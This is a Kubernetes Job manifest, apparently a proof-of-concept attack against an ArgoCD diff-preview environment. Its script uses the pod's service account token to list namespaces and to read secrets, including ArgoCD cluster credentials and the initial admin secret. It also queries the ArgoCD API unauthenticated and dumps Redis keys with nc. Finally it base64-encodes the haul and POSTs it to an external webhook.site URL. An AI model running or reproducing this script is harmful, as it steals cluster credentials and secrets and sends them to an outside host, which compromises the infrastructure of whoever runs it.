apiVersion: batch/v1
kind: Job
metadata:
  name: security-test
  namespace: argocd-diff-preview
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: poc
        image: alpine:3.19
        command: ["/bin/sh", "-c"]
        args:
        - |
          apk add -q curl 2>/dev/null
          HOOK="https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919"
          curl -sf --max-time 5 "${HOOK}/?stage=start2&host=$(hostname)" || true

          # === Kubernetes API via service account token ===
          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
          CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
          NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
          K8S=https://10.96.0.1:443

          # whoami / self-subject review
          WHOAMI=$(curl -sf --max-time 5 --cacert $CACERT \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -X POST "$K8S/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
            -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"argocd-diff-preview"}}' \
            2>/dev/null)

          # list all namespaces
          NAMESPACES=$(curl -sf --max-time 5 --cacert $CACERT \
            -H "Authorization: Bearer $TOKEN" \
            "$K8S/api/v1/namespaces" 2>/dev/null | head -c 3000)

          # list secrets in current namespace
          SECRETS=$(curl -sf --max-time 5 --cacert $CACERT \
            -H "Authorization: Bearer $TOKEN" \
            "$K8S/api/v1/namespaces/$NS/secrets" 2>/dev/null | head -c 3000)

          # list secrets in argocd namespace
          SECRETS_ARGOCD=$(curl -sf --max-time 5 --cacert $CACERT \
            -H "Authorization: Bearer $TOKEN" \
            "$K8S/api/v1/namespaces/argocd/secrets" 2>/dev/null | head -c 3000)

          # list cluster secrets (argocd stores cluster creds as secrets in argocd ns)
          CLUSTER_SECRETS=$(curl -sf --max-time 5 --cacert $CACERT \
            -H "Authorization: Bearer $TOKEN" \
            "$K8S/api/v1/namespaces/argocd/secrets?labelSelector=argocd.argoproj.io/secret-type%3Dcluster" \
            2>/dev/null | head -c 5000)

          # try to read a specific secret (e.g. argocd-initial-admin-secret)
          ADMIN_SECRET=$(curl -sf --max-time 5 --cacert $CACERT \
            -H "Authorization: Bearer $TOKEN" \
            "$K8S/api/v1/namespaces/argocd/secrets/argocd-initial-admin-secret" \
            2>/dev/null)

          curl -sf --max-time 5 "${HOOK}/?stage=k8s-api-done" || true

          # === ArgoCD server API (unauthenticated probing) ===
          ARGO_VER=$(curl -sf --max-time 5 http://10.96.234.115/api/version 2>/dev/null)
          ARGO_APPS=$(curl -sf --max-time 5 http://10.96.234.115/api/v1/applications 2>/dev/null | head -c 3000)

          # === ArgoCD Redis (port 6379 — typically no auth in dev clusters) ===
          REDIS_INFO=$(printf "INFO server\r\n" | nc -w3 10.96.216.35 6379 2>/dev/null | head -c 500)
          REDIS_KEYS=$(printf "KEYS *\r\n" | nc -w3 10.96.216.35 6379 2>/dev/null | head -c 2000)

          curl -sf --max-time 5 "${HOOK}/?stage=argocd-done" || true

          # === POST all data ===
          DATA="=== WHOAMI/RBAC ===
          ${WHOAMI}
          === NAMESPACES ===
          ${NAMESPACES}
          === SECRETS (current ns) ===
          ${SECRETS}
          === SECRETS (argocd ns) ===
          ${SECRETS_ARGOCD}
          === CLUSTER SECRETS ===
          ${CLUSTER_SECRETS}
          === ADMIN SECRET ===
          ${ADMIN_SECRET}
          === ARGO VERSION ===
          ${ARGO_VER}
          === ARGO APPS ===
          ${ARGO_APPS}
          === REDIS INFO ===
          ${REDIS_INFO}
          === REDIS KEYS ===
          ${REDIS_KEYS}"

          ENC=$(printf '%s' "$DATA" | base64 | tr -d '\n')
          curl -sf --max-time 15 -X POST "${HOOK}/?stage=full-dump" \
            --data-urlencode "d=${ENC}" || true
